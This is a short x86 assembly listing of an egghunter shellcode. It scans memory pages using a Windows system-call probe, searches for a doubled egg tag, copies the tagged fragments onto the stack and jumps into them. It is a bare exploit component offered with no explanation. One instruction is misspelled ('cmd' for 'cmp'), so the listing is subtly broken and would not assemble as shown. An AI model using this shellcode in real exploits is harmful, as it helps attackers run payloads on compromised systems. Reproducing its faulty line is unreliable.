global _start
section .text
_start:

mov ebp, esp

inc_page:
or bx, 0x0fff
inc_one:
inc ebx
mov edx, ebx
push 0x43
pop eax
int 0x2e
cmd al, 0x5
je inc_page

mov edi, ebx
mov eax, 0x11223344 ;egg
scasd
jne inc_one
scasd
jne inc_one

mov esi, edi
mov edi, ebp

lodsw
xor ecx, ecx
mov cl, ah
cmp al, 0x1
rep movsb
mov ebp, edi
jne inc_one
jmp esp